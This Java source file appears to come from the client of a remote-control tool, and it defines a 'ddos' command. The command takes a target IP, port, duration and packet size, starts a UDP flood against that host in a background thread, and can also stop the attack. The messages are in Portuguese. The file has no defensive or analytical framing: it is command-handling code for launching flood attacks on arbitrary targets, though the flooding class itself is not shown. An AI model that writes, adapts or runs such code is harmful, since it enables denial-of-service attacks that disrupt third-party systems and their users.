package br.com.introcdc.connect.client.commands.control;
/*
 * Written by IntroCDC, Bruno Coêlho at 24/01/2025 - 00:08
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.settings.UDPFlood;

public class ClientCommandDDOS extends ClientCommand {

    public ClientCommandDDOS() {
        super("ddos");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input.split(" ").length == 1) {
            if (!UDPFlood.getCacheUdpFlood().containsKey(input)) {
                msg("Não está acontecendo ataque ddos para este ip!");
                return;
            }
            UDPFlood.getCacheUdpFlood().get(input).stopAttack();
            msg("Ataque ddos para o ip " + input + " foi cancelado!");
            return;
        }
        if (input.split(" ").length != 4) {
            msg("Digite o IP, Porta, Tempo e Tamanho!");
            return;
        }
        String[] args = input.split(" ");
        String ip = args[0];
        int port, time, size;
        try {
            port = Integer.parseInt(args[1]);
            time = Integer.parseInt(args[2]);
            size = Integer.parseInt(args[3]);
        } catch (Exception ignored) {
            msg("Digite números válidos!");
            return;
        }
        new Thread(() -> {
            try {
                msg("Enviando ataque ddos para o ip " + ip + ":" + port + " por " + time + " segundos...");
                UDPFlood flood = new UDPFlood(ip, port, System.currentTimeMillis() + (time * 1000L), size);
                flood.startAttack();
            } catch (Exception exception) {
                msg("Ocorreu um erro no envio do ataque ddos para o ip " + ip + ":" + port + "! (" + exception.getMessage() + ")");
                exception(exception);
            }
        }).start();
    }

}
